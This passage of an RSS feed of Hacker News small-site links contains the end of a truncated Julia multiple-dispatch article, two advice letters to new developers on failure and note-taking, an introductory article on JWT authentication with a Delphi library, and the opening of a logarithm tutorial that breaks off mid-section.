N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray} where N where T, SubArray{T,N,A,I,true} where I&lt;:Union{Tuple{Vararg{Real,N} where N}, Tuple{AbstractUnitRange,Vararg{Any,N} where N}} where A&lt;:DenseArray where N where T, DenseArray} where N where T, DenseArray}, SubArray{TB,2,A,I,L} where L where I&lt;:Tuple{Vararg{Union{Int64, AbstractRange{Int64}, Base.AbstractCartesianIndex},N} where N} where A&lt;:Union{Base.ReinterpretArray{T,N,S,A} where S where A&lt;:Union{SubArra…</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://opensourc.es/blog/basics-multiple-dispatch/">https://opensourc.es/blog/basics-multiple-dispatch/</a></em></p>]]>
            </description>
            <link>https://opensourc.es/blog/basics-multiple-dispatch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740622</guid>
            <pubDate>Sun, 05 Jul 2020 18:10:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get Used to Failure (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740513">thread link</a>) | @mooreds
<br/>
July 5, 2020 | https://letterstoanewdeveloper.com/2018/12/31/get-used-to-failure/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2018/12/31/get-used-to-failure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Dear new developer,</p>
<p>I was chatting with someone <a href="https://letterstoanewdeveloper.com/2018/10/24/join-a-meetup/">I met at a meetup</a> who was about to graduate from a bootcamp. I asked him what his advice to a new developer would be. He said that it would be “get used to failure, and get used to working through it.”</p>
<p>I thought that advice was great.</p>
<p>I often tell colleagues that “if it is easy, someone would have already automated it”. This means that when you are working on a software problem, the problem <strong>by definition</strong> hasn’t been solved within your organization (that you know of; I’ll come back to that). This means that you’ll most often be failing. Just like scientists who try to narrow down their scope of inquiry so they can have useful experiments, you’ll try to narrow down the problem and pattern match and research so that you can have a working solution. But just like the <a href="https://en.wikipedia.org/wiki/Michelson%E2%80%93Morley_experiment">best planned experiments fail</a>, so will you, often.</p>
<p>There are two additional complexities that software developers have that scientists do not.</p>
<p>The tools that software developers use are themselves software and are being developed. Imagine trying to build a house when the hammers and saws that you are using are themselves changing at a rapid pace. This means that the solution that may have worked in the past is suboptimal.</p>
<p>And the real world that scientists operate on and try to understand doesn’t often change daily. The business world that software developers operate on and try to understand can change on the whim of a person in authority. This is an <a href="https://en.wikipedia.org/wiki/No_Silver_Bullet">essential complexity</a> of software development.</p>
<p>This experience requires you to get used to failure, both at the micro and macro levels. And to keep going. You just need to be tenacious and realize that you’ll solve the problem. Also, recognize the frustration and realize that everyone is going through it. A coach once taught me that running is hard for everyone, whether you are running a 5 minute mile or a 10 minute mile. The same is true for development. Learning something new is difficult and frustrating, whether it’s your first programming language or the intricacies of a build and deployment process that is new to you.</p>
<p>Get used to failure and remember that everyone else encounters it.</p>
<p>I mentioned I’d return to the caveat that problems you tackle haven’t been solved “that you know of”. Back in the dark ages before the internet was widespread, distribution of software knowledge was slow and driven by email, bulletin boards, journals and books. Now we have google and stack overflow. This helps with coming up to speed on external software that will help you solve problems. I’ve yet to see an internal system that works well for sharing knowledge, but it is incumbent on you and your teams to search out solutions within your organization.</p>
<p>Once you have a problem defined (even partially), resist the temptation to dive in and start building a solution. Rather, pop your head up and ask around and see if anyone has solved your problem. Or even one third of it. You may or may not re-use their solution, but it will inform your solution even if you don’t.</p>
<p>Sincerely,</p>
<p>Dan</p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2018-12-31T10:23:42-07:00">December 31, 2018</time><time datetime="2019-08-14T07:38:03-06:00">August 14, 2019</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2018/12/31/get-used-to-failure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740513</guid>
            <pubDate>Sun, 05 Jul 2020 17:56:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JWT Authentication with Delphi (2017)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740445">thread link</a>) | @todsacerdoti
<br/>
July 5, 2020 | http://blog.paolorossi.net/2017/04/27/jwt-authentication-with-delphi/ | <a href="https://web.archive.org/web/*/http://blog.paolorossi.net/2017/04/27/jwt-authentication-with-delphi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        
                        <h2>JWT authentication with Delphi. Part 1</h2>
                        
                    </div><div>
                        <div>
                            <!-- Articles Index -->  

  

<hr>

<p>  
This is the first article I will write about JWT and authentication technologies using Delphi, specifically I'll cover the topic of authentication (mostly in a HTTP world) using tokens (specifically JSON Web Tokens).  
</p>

<p>  
The Delphi library used in this article is the open source <a href="https://github.com/paolo-rossi/delphi-jose-jwt" target="_blank"><strong>delphi-jose-jwt</strong></a> library (created by me) and available on <a href="https://github.com/paolo-rossi/delphi-jose-jwt" target="_blank"><strong>GitHub</strong></a>. This library is listed on the <a href="https://jwt.io/" target="_blank"><strong>JWT.io</strong></a> site and  
it's already used in several projects (open source and commercial) but before we dive into the code let’s cover some basics about JWT's.  
</p>



<p>  
Authentication is the process of identifying someone (or something) determining that is who is claimed to be. Remember that in this article I will be speaking only about authentication and not authorization (that is giving individuals access to system objects based on their identity)  
</p>

<!-- WiRL -->  



<h2 id="sessionbasedauthentication">Session based authentication  </h2>

<p>  
In the HTTP world, applications have traditionally used session cookies to store authentication information. The mechanism relies on session IDs stored server-side. The session storage is typically an in-memory list/table (that is server-specific), or a separate session storage layer (often the back-end database).  
</p>

<p>  
In HTTP the communication is essentially stateless, so the cookie (that contains the session ID) is used by the server as a “key” to retrieve information about the client side (user or process). The cookie is created by the server and sent to the client, in the next request, the cookie is bounced back so the server can lookup the session ID in the session table.  
</p>

<p>Disadvantages of “cookie” based auth:</p>

<ul>
<li><strong>Sessions</strong>: Sessions are just stored on server’s memory</li>
<li><strong>Mobile</strong>: Native mobile apps seems to have problems working with cookies so if we need to query a remote API, maybe session auth is not the best solution.</li>
<li><strong>CSRF</strong>: (Cross-Site Request Forgery) If we go down the cookies way, you really need to do CSRF to avoid cross site requests. That is something we can forget when using JWT as you will see.</li>
<li><strong>CORS</strong>: (Cross-Origin Resource Sharing) Have you fight with CORS and cookies? No need to wrestle using JWT.</li>
</ul>

<h2 id="tokenbasedauthentication">Token based authentication  </h2>

<p>  
The main problem of a session based authentication is that the server must maintains a list of session to be able to “validate” the incoming request and that is a problem because only one server knows how to validate a client request (no scalability or availability).  
</p>

<p>  
So, token authentication was developed to solve problems of server-side session IDs. Using tokens instead of session IDs has the effect of lowering the server load and remove the need of storing an in-memory session table or having an expensive session storage layer (performance). JWT are stateless by definition so they are perfect for this task (more on that, later).  
</p>

<p>  
Before a token is created the user must, obviously, supply verifiable credentials (standard username/password pair, API keys, hardware IDs, or even tokens from another service) and consequently perform some sort of “login” action.  
</p>

<p>  
Keep in mind that JWT is not the only “standard” token representation out there, <b>SWT</b> (Simple Web Token) is (was) a proposed standard (Microsoft 2009) and <b>SAML</b> (Security Assertion Markup Language Token) is an open-standard for exchanging authentication and authorization data between parties based on XML (SAML 2.0, OASIS Standard 2005).  
</p>

<h2 id="oauth2">OAuth 2  </h2>

<p>  
Often I read about OAuth 2 and JWT as if they were comparable (and competing) standards… well, they are not!  
</p>

<p>  
OAuth 2 is an authorization framework that can employ JWT as the format for the OAuth 2 tokens, remember that OAuth2 is not an authentication protocol (because OAuth2 doesn’t know nothing about the user). OAuth 2 is a rather complex topic and I think I will write another article on this topic.  
</p>



<p>  
A JSON Web Token or JWT (pronounced “jot”) is a signed piece of data in JSON format and because it's signed the recipient (the server) can, and must, verify its authenticity.  
</p>

<p>  
The workflow is basically this: a user wants to authenticate so he sends the username and password (for example), the server validates the user and creates a (cryptographically) signed token and then sends it back to the user. The user sends the token with the next request and the server checks if the signature is genuine and (eventually) grants the access to the requested resource. In detail:  
</p>

<ol>
<li>The user sends username and password to an authentication service  </li>
<li>The authentication service responds with a signed JWT with information about the user  </li>
<li>The user requests a resource on the server sending the token back  </li>
<li>The server checks the signature and if it's genuine the access is granted</li>
</ol>

<!-- Linux Daemon -->  



<h2 id="afirstlooktoajwt">A first look to a JWT  </h2>

<p>This is what a JWT looks like:</p>

<pre><code><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span>.<span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span></code>
</pre>

<p>The same JWT decoded:</p>

<pre><code>{
  "alg": "HS256",
  "typ": "JWT"
}
.
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
.
HMACSHA256(  
  base64UrlEncode(header),
  base64UrlEncode(payload),
  secret
)
</code></pre>

<p>As you can see the token is composed of three parts:</p>

<ol>
<li>In the first part (called <b>header</b>) are stored information about the signing algorithm and the type of payload (JWT)  </li>
<li>The second (the <b>payload</b>) contains the actual user data (claims)  </li>
<li>The third part is the <b>signature</b> computed (in this example) with the HMACSHA256 algorithm.</li>
</ol>

<h2 id="whatisjose">What is JOSE?  </h2>

<p>  
Before I talked about the Delphi JWT library <a href="https://github.com/paolo-rossi/delphi-jose-jwt" target="_blank"><strong>delphi-jose-jwt</strong></a>, but what is JOSE? (and no, is not my name!). <b>JOSE</b> stands for <b>JSON Object Signing and Encryption</b> and is a (set of) standard that provides a general approach to signing and encryption of any content. JOSE consists of several RFC:  
</p>

<ul>
<li><a href="https://tools.ietf.org/html/rfc7519">JWT (JSON Web Token)</a> describes representation of claims encoded in JSON</li>
<li><a href="https://tools.ietf.org/html/rfc7515">JWS (JSON Web Signature)</a> describes producing and handling signed messages</li>
<li><a href="https://tools.ietf.org/html/rfc7516">JWE (JSON Web Encryption)</a> describes producing and handling encrypted messages</li>
<li><a href="https://tools.ietf.org/html/rfc7518">JWA (JSON Web Algorithms)</a> describes cryptographic algorithms used in JOSE</li>
<li><a href="https://tools.ietf.org/html/rfc7517">JWK (JSON Web Key)</a> describes format and handling of cryptographic keys in JOSE</li>
</ul>

<p>  
<b>In a nutshell:</b> the JWT contains the claims, the JWS is the JWT when signed, the JWE is the JWT when encrypted, the JWA defines the algorithms used in JOSE and the JWK describes the handling of the cryptographic keys used in the process.  
</p>

<p>  
Often the term JWT is used when describing some other JOSE definitions so, for simplicity, in this article I will be using the term JWT.  
</p>

<h2 id="jwtandrest">JWT and REST  </h2>

<p>  
JWT have become very popular with the wide adoption of REST architectural style, but we can use JWT tokens to authenticate in various context, not only REST applications.  
</p>

<p>  
Tokens (and JWTs) are merely an authentication representations and so they can be used in multiple scenarios:  
</p>

<ul>
<li>REST services authentication</li>
<li>OAuth 2.0 communications</li>
<li>CSRF (Cross Site Request Forgery) protection schemes</li>
<li>More in general as session IDs (eventually inside a cookie)</li>
</ul>

<p>  
In this article(s) I will focus on REST technologies but I will give some example of using JWT in other contexts.  
</p>

<!-- Neon -->  



<h2 id="jwtbenefitsinarestfulservice">JWT benefits in a RESTful service  </h2>

<p>  
In his famous dissertation, Roy T. Fielding defines 6 constraints for (truly) RESTful services:  
</p>

<ol>
<li>Client/server architecture  </li>
<li>Stateless communication  </li>
<li>Cache (on the client)  </li>
<li>Uniform Interface  </li>
<li>Layered system  </li>
<li>Code on-demand</li>
</ol>

<p>  
The most important (to me) is the second (and consequently the third one) that states REST interactions between client and server must be stateless by nature.  
</p>

<p>  
That means that requests (from the client) must contain all of the information necessary to understand the request and so they cannot take advantage of any stored context on the server and this, unfortunately, includes the session table typically stored on servers (automatic session management is one of the most publicized features of HTTP server frameworks).  
</p>

<p>  
The second constraint (if satisfied) induces the properties of <b>visibility</b> (looking at a request is sufficient to visualize the interaction), <b>reliability</b> (failure of one request does not influence others), and <b>scalability</b> (a server can switch a request to another server). Given these advantages you can see why this constraint is so important when building a REST server! Oh, and remember that JWT helps you to achieve this goal because:  
</p>

<ul>
<li>Using JWTs there’s no need of sessions</li>
<li>Using JWTs there’s no need of session storage (on server)</li>
<li>Using JWTs there’s no need of garbage collection of expired sessions</li>
</ul>

<h2 id="conclusion">Conclusion  </h2>

<p>  
So, as you can see, JWT is a simple and yet powerful technology to accomplish several tasks.  
</p>

<p>  
In the next post I will explain in detail the JWT’s claims and we'll start to explore the <a href="https://github.com/paolo-rossi/delphi-jose-jwt" target="_blank"><strong>delphi-jose-jwt</strong></a> library features.  
</p>

<p>  
<img src="http://blog.paolorossi.net/content/images/2017/04/firma-round.png" width="200">  
</p>




                        </div>
                        
                    </div></div>]]>
            </description>
            <link>http://blog.paolorossi.net/2017/04/27/jwt-authentication-with-delphi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740445</guid>
            <pubDate>Sun, 05 Jul 2020 17:48:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Write That Down (2018)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740444">thread link</a>) | @todsacerdoti
<br/>
July 5, 2020 | https://letterstoanewdeveloper.com/2018/12/28/write-that-down/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2018/12/28/write-that-down/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><em>This is a guest blog post from John Obelenus. Enjoy.</em></p>
<p>Dear new developer,</p>
<p id="bfca">Even when I was a kid in school I hardly wrote things down. That’s why we had textbooks after all! I was baffled by other students in college furiously transcribing every word that came out of the professor’s mouth. Now I have a career in the world of software where we track everything. Git holds all the code commits, email is never really deleted, and project management and issue tracking tools keep track of what we’re doing and have done. How could anything go missing?</p>
<p id="7f29">I constantly looking for things and cannot find them. I get a bug report, look at the code and say to myself “That is obviously wrong, let’s fix it.” I look at the offending commit that introduced the bug (of course it was me). But what is not there? The reason for the change. So I look at the project management tool we use. And someone definitely asked for a change, but, I’m still not sure why. So I search through my email for the few days before I made the change, and…nothing. I still cannot really figure out why we all decided to make a change which introduced a bug.</p>
<p id="f3ec">Or, worse yet, someone asks for a change. All well and good. Then a month later, someone asks to change it back. So you shake your head and make the change. Then someone is confused why this is happening, and calls a meeting and invites you to help figure it out. What are you going to bring to this meeting? Did you write anything down? I never used to. Now I do.</p>
<p id="2737">Now I have a notepad next to my laptop. And I have a notebook on the shelf. I make better use of git messages and write down who asked for changes. When working on a feature, or a bug, and find something…“interesting” I make a Github wiki entry explaining it. I write a comment in the code base explaining it. There are two kinds of documentation — useful documentation, and redundant documentation.</p>
<p id="2f04">No doubt many people have told you to comment your code. I hope many people have told you never to comment a loop with <code>// loop over the array</code>. That is not increasing clarity, its just duplicating what the code is doing. Adding noise, not signal. My contention is that comments are rarely useful for explaining “What this code does…” but rather, explains “Because of X, we are going to do…”.</p>
<p id="50b8">Future you is going to be very happy if you start documenting the intent behind what you’re doing. Good code is easy to read. Bad code is capable of being understood with time. But code doesn’t tell you why you’re doing all this work in the first place. Maybe something has changed and you don’t even need this code anymore — deleting code is the most satisfying feeling. But you won’t know unless you know the intent, the purpose, of the code. And the rest of the folks you’re working with are going to be very happy as well.</p>
<p id="f74a">If you write everything down (and make it public), they won’t need to tap you on the shoulder when you’re in “The Zone” to ask. When someone wants to set a meeting to understand why things are “The Way They Are” you already captured that information. You can send them the link and kill the meeting (Ok, maybe killing meetings is more satisfying than killing code).</p>
<p id="2b74">We only have so much time in our life, and we already work long hours. Let’s make future us happier by writing things down, so we don’t have to figure it all out again. We figured it out once when we wrote the code. So capture the knowledge in that moment in time. And Write It Down!</p>
<p>Sincerely,</p>
<p>John Obelenus</p>
<p><a href="https://medium.com/@jobelenus/write-that-down-adf7baa3d92b">(Previously published at Medium)</a></p>
<p><em>John Obelenus solves problems and saves time through software and crushing entropy<br>
</em></p>

<p><em>J</em></p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2018-12-28T19:38:58-07:00">December 28, 2018</time><time datetime="2019-02-03T09:41:16-07:00">February 3, 2019</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2018/12/28/write-that-down/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23740444</guid>
            <pubDate>Sun, 05 Jul 2020 17:48:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nine properties of logarithm: theory and examples]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23740417">thread link</a>) | @R3G1R
<br/>
July 5, 2020 | https://mathvault.ca/logarithm-theory/#Properties_of_Logarithm | <a href="https://web.archive.org/web/*/https://mathvault.ca/logarithm-theory/#Properties_of_Logarithm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://mathvault.ca/wp-content/uploads/Logarithm-Post.jpg" alt="The Ultimate Guide to Logarithm - Properties of Logarithm, Complex Logarithm and More!" width="800" height="480" title="Logarithm Post" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20480'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Logarithm-Post.jpg"></p><p>For the very vast majority of humans on earth, there is a topic found in the good&nbsp;old math textbooks that many of us still even dread contemplating about, as&nbsp;it seems to mess with our brain in a rather<em>&nbsp;particular</em> way.&nbsp; The name? <a href="https://en.wiktionary.org/wiki/logarithmus" target="_blank" rel="noopener noreferrer">$\displaystyle \text{Logarithmus}$</a> — or <strong>Logarithm</strong> in English to be sure!</p><p>As terrible-sounding as it is, logarithm seems to have this <em>distinct</em> characteristic of metaphorically leaving a <em>bad taste</em> in our mouth. In fact, even for those who managed to maneuver around&nbsp;it back in high school, logarithm still remains largely as an <em>evasive</em> concept. The <strong>“I-can-manipulate-expressions-without-understanding-anything” syndrome</strong>&nbsp;runs rampant when it comes to logarithm.</p><p>Indeed, here in North America, the&nbsp;grade school curriculum has the propensity of overemphasizing the&nbsp;<strong>mechanics</strong>&nbsp;at the expense of&nbsp;<strong>basic theory</strong>, leaving us with the <em>formidable</em> task of filling in the <em>logarithmic</em> knowledge gap, which includes — among others&nbsp;— the theory behind the <strong>properties of logarithm</strong>, and its intended <strong>computational use</strong> in handling&nbsp;numbers with an&nbsp;<strong>order of magnitude</strong> veering towards the extremes.</p><p>So with that in mind, if you think that the time might have finally come to tame this <em>monster</em> we call logarithm, then it would be our pleasure to congratulate your timing on this very honorable act. And if&nbsp;you are simply looking to&nbsp;explore further into the rabbit hole, that would be <em>doubly</em> appreciated as well, for regardless of your motivation, the <strong>taming</strong>/<strong>musing</strong> is on!&nbsp;&nbsp;🙂<span id="more-5976"></span></p><h2 id="review"><span id="Logarithm_%E2%80%94_A_Review"></span><a href="#toc">Logarithm — A Review</a><span></span></h2><h3 id="terms"><span id="Terminology"></span><a href="#toc">Terminology</a><span></span></h3><p>Given a <em>real number</em> $x$, one of the challenges in <strong>elementary algebra</strong> is to express $x$ as a <em>power</em> of another number $b$ (known as the <strong>base</strong>). More specifically, we are interested in finding a&nbsp;number $\Box$ such that:</p><p>\begin{equation*} x = b^\Box \end{equation*}</p><p>As it turns out, this problem — in the <em>crude</em> form that it currently is at least — needs to be patched up first&nbsp;before any meaningful discussion can take place. For example:</p><ul><li>If the base is <em>negative</em>, then its powers need not be necessarily&nbsp;<a href="https://mathvault.ca/math-glossary/#welldefined"><strong>well-defined</strong></a> (e.g., $\displaystyle (-e)^{\frac{1}{2}}$).</li><li>If the base is $\displaystyle 1$, then any power of it would be just $1$, in which case, it would be <em>impossible</em>&nbsp;for it to generate any&nbsp;number that’s not $1$. A&nbsp;similar remark applies to the case&nbsp;where&nbsp;the base is equal to $0$.</li></ul><p>For these reasons, in the context of <strong>power determination</strong>, it’s customary to require&nbsp;the&nbsp;base $b$ to be a <em>positive</em> number — that is not equal to $1$. While under this assumption, any power of $b$ would necessarily have to be <em>positive</em>, it would also transpire —under this setup — that <em>any</em>&nbsp;positive number can be expressed as a power of $b$ in a <em>unique</em> way. That is, as long as $x$ is <em>positive</em>, there will be a <em>unique</em> number $\Box$ (known as the&nbsp;<strong>exponent</strong>) such that:</p><p>\begin{equation*} x= b^{\Box} \end{equation*}</p><p>in which case, we will simply call $\Box$ the <strong>logarithm</strong> of $x$ (in base $b$). In other words, logarithm is basically what happens when we expressed a number as a <em>power</em>, and then take the <em>exponent</em> from that power —&nbsp;It gives&nbsp;us the <strong>magnitude</strong> of a number, with respect to the base in question.</p><p>For example, when we try to express the number $64$ as a power of $2$, we get that $64= 2^6$. This alone shows that $6$ is the logarithm of $64$ — &nbsp;with respect to the base $2$.</p><p>Notation-wise, the logarithm of $x$ in <strong>base</strong> $b$ is denoted by $\log_b x$, with $x$ also being called&nbsp;the <strong>argument</strong> of the logarithm. When considered as a function, $\log_b x$ is defined on all <em>positive</em> numbers — as long as&nbsp;the base $b$ is <strong>valid</strong> (i.e.,&nbsp;&nbsp;$\displaystyle b&gt;0, b \ne 1$) .</p><p>To begin,&nbsp;we first note that <em>regardless</em> of the value of the base $b$, we always have that:</p><ul><li>$\displaystyle \log_b 1 = 0$ (since $0$ is the number $b$ needs to be raised to yield $1$)</li><li>$\displaystyle \log_b b&nbsp;= 1$ (since $1$ is the number $b$ needs to be raised to yield $b$)</li><li>$\displaystyle \log_b \frac{1}{b} = -1$ (since $-1$ is the number $b$ needs to be raised to yield $\displaystyle \frac{1}{b}$)</li></ul><p>Because these results are almost immediate and sufficiently notable, we’ll simply&nbsp;refer to&nbsp;them as the&nbsp;<strong>trivial logarithmic identities</strong>.</p><p>In addition,&nbsp;since $\log_b x$ stands for the number which&nbsp;<em>exponentiates</em> to $x$, we also have that by definition:</p><p>\begin{align*}b^{\log_b x} &amp; = x \qquad (\text{for all }x&gt;0)\end{align*}</p><p>On the other hand,&nbsp;we also have that:</p><p>\begin{align*} \log_b (b^x) = x \qquad (\text{for all } x \in \mathbb{R}) \end{align*}</p><p>Since one can see by inspection that $x$ is precisely the number which exponentiates to $b^x$.</p><p>For&nbsp;example, since $\displaystyle \log_2 53$ is the number that $2$ needs to raise to yield $53$, we have that $\displaystyle 2^{\log_2 53} =53$. Similarly, since $\displaystyle 10^{-\pi}$ is a power of $10$ with the exponent $-\pi$, we can infer&nbsp;that $\displaystyle \log_{10} \left(10^{-\pi}\right) = -\pi$.</p><h3 id="10"><span id="Common_Logarithm_(Base_10)"></span><a href="#toc">Common Logarithm (Base 10)</a><span></span></h3><p>Being the inverse of the exponential function $\displaystyle 10^x$, the base-$10$ logarithmic function — also known as the&nbsp;<a href="https://en.wikipedia.org/wiki/Common_logarithm" target="_blank" rel="noopener noreferrer"><strong>common logarithm</strong></a> — is customarily denoted by $\log_{10} x$, $\log x$, or simply $\lg x$ for short. The common logarithm is of great interest to us, primarily&nbsp;due to the prevalence of the&nbsp;<strong>decimal number system</strong> in various cultures around the world.</p><div><p><strong>Caution</strong></p><p>Note that in older scientific texts and some textbooks in higher mathematics, $\log x$ can also refer to — and usually is — the <a href="#e">natural logarithm of base $e$</a>.</p></div><p>When the common logarithm of a number is calculated, the&nbsp;<em>decimal representation</em> of the logarithm is usually split into two parts: the integer component&nbsp;(a.k.a., <strong>characteristic</strong>) and the fractional component&nbsp;(a.k.a., <strong>mantissa</strong>). The characteristic in essence tells us &nbsp;the <strong>number of digits</strong> the original number has, and the mantissa hints at the extent to which this&nbsp;number is close to its next power of $10$. These are the facts that make common logarithm a&nbsp;particularly handy tool in determining the <strong>order of magnitude</strong> of an <em>exceptionally&nbsp;large</em> (or <em>small</em>) number.</p><p>For example, to figure out the magnitude of the number $50!$ (i.e., $50 \times \cdots \times 1$), we proceed to calculate its logarithm, yielding that: \[ \log (50!) \approx 64.483 \] which means that $50! \approx 10^{64.483} =$ $10^{64}10^{0.483} \approx$ $10^{64} \cdot 3.04$, suggesting that $50!$ is a $65$<em>-digit number</em> which starts with $3$ — the <strong>characteristic</strong> $64$ gives away the number of digits, and the <strong>mantissa</strong> $0.483$ reveals&nbsp;the rest about the number itself.</p><p>Take home message? There is no need to&nbsp;write out a number in full to figure out its <em>approximate size</em>!</p><h3 id="2"><span id="Binary_Logarithm_(Base_2)"></span><a href="#toc">Binary Logarithm (Base 2)</a><span></span></h3><p>Being the inverse of the exponential function $2^x$, the <a href="https://en.wikipedia.org/wiki/Binary_logarithm" target="_blank" rel="noopener noreferrer"><strong>binary logarithm</strong></a>&nbsp;function $\log_2 x$ is extensively used in the field of <strong>computer science</strong>, primarily due to the fact that computers store information in <strong>bits</strong> (i.e., digits which takes $0$ or $1$ as possible values).</p><p>Similar to the case in base $10$, binary logarithm can be used to figure out&nbsp;the number of digits&nbsp;of a positive integer&nbsp;in <a href="https://en.wikipedia.org/wiki/Binary_number#Counting_in_binary" target="_blank" rel="noopener noreferrer"><strong>binary representation</strong></a>. In addition, binary logarithm is also used to figure out the <em>depth</em> of a <a href="https://en.wikipedia.org/wiki/Binary_tree" target="_blank" rel="noopener noreferrer"><strong>binary tree</strong></a>, or even the <em>number of operations</em> required by certain <strong>computer algorithms</strong>&nbsp;(this falls into a topic known as&nbsp;<a href="https://en.wikipedia.org/wiki/Time_complexity" target="_blank" rel="noopener noreferrer"><strong>algorithmic time complexity</strong></a>).</p><p>Beyond&nbsp;the world of computers, binary logarithm is also used in&nbsp;<strong>music theory</strong> to conceptualize the <em>highness</em>&nbsp;of&nbsp;musical notes, based&nbsp;on the fundamental&nbsp;observation&nbsp;that <em>raising</em>&nbsp;a note by an <strong>octave</strong>&nbsp;increases the frequency of the note by&nbsp;<em>twofold</em>. As a result, it is often convenient to conceive a&nbsp;<strong>musical interval</strong>&nbsp;as the binary logarithm of the <a href="https://en.wikipedia.org/wiki/Interval_ratio" target="_blank" rel="noopener noreferrer"><strong>frequency ratio</strong></a>.</p><h3 id="e"><span id="Natural_Logarithm_(Base_$e$)"></span><a href="#toc">Natural Logarithm (Base $e$)</a><span></span></h3><p>In some textbooks concerned with a more rigorous development&nbsp;of&nbsp;<a href="https://en.wikipedia.org/wiki/Transcendental_function" target="_blank" rel="noopener noreferrer"><strong>transcendental functions</strong></a>, the base-$\displaystyle e$ logarithmic function — otherwise known as&nbsp;<strong>natural logarithm</strong>, $\log_e x$ or simply $\ln x$ — are sometimes defined as the <em>area</em>&nbsp;between the <strong>reciprocal function</strong>&nbsp;$\frac{1}{x}$ and the x-axis from $1$ to $x$ (hence the term <em>natural</em>).</p><div id="attachment_5991"><p><img aria-describedby="caption-attachment-5991" src="https://mathvault.ca/wp-content/uploads/Harmonic-Series.png" alt="Natural Logarithm and the Divergence of the Harmonic Series" width="295" height="230" title="Harmonic Series" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20295%20230'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Harmonic-Series.png"></p><p id="caption-attachment-5991">Defined as the area underneath the reciprocal function, the function $\ln x$ increases without bound as $x$ increases, thereby showing that the <strong>Harmonic Series</strong> (i.e., $ \frac{1}{1} + \frac{1}{2}+ \ldots$ ) — whose area is even greater than that of $\ln x$ — diverges to $+ \infty$ as well.</p></div><p>Under this definition, it could be shown that the inverse of $\ln x$ is precisely the <strong>natural&nbsp;exponential function</strong> $e^x$, leading to the&nbsp;following&nbsp;<em>standard</em>&nbsp;definition of&nbsp;natural logarithm:</p><blockquote><h6>Given a positive number $x$,&nbsp;$\ln x$ denotes the number that $e$ needs to be raised, to&nbsp;become $x$.</h6></blockquote><p>Unlike the number $10$ — which is preferred due to the prevalence of&nbsp;<strong>decimal numbering system</strong> — the number $\displaystyle e$ is one of the <a href="https://mathvault.ca/hub/higher-math/math-symbols/#Constants" target="_blank" rel="noopener noreferrer">special constants</a>&nbsp;that&nbsp;pops up surprisingly often in various mathematical discourses —&nbsp;<em>irrespective</em> of the&nbsp;number system being chosen.&nbsp;As a result, mathematicians tend to consider base $e$ as more <em>natural</em> than base $10$ — even though some&nbsp;applied scientists and engineers beg to differ in various occasions…</p><p>Actually, to illustrate the scope of these&nbsp;<em>intellectual biases</em>&nbsp;among the scientific community, here’s an interesting account from <a href="https://en.wikipedia.org/wiki/Common_logarithm#History" target="_blank" rel="noopener noreferrer">Wikipedia</a>&nbsp;on the <strong>historical development</strong>&nbsp;of the&nbsp;notations for logarithms:</p><blockquote><h6>Because base 10 logarithms were most useful for computations, engineers generally simply wrote “log(x)” when they meant log<sub>10</sub>(x). Mathematicians, on the other hand, wrote “log(x)” when they meant log<sub>e</sub>(x) for the natural logarithm. Today, both notations are found. Since hand-held electronic calculators are designed by engineers rather than mathematicians, it became customary that they follow engineers’ notation. So the notation, according to which one writes “ln(x)” when the natural logarithm is intended, may have been further popularized by the very invention that made the use of “common logarithms” far less common, electronic calculators.</h6></blockquote><h3 id="arbitrary"><span id="Logarithm_of_an_Arbitrary_Base"></span><a href="#toc">Logarithm of an Arbitrary Base</a><span></span></h3><div id="attachment_6036"><p><img aria-describedby="caption-attachment-6036" src="https://mathvault.ca/wp-content/uploads/Graphs-of-Different-Logarithms.png" alt="Graphs of the Logarithmic Functions of base 2, e and 10" width="297" height="223" title="Graphs of Different Logarithms" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20297%20223'%3E%3C/svg%3E" 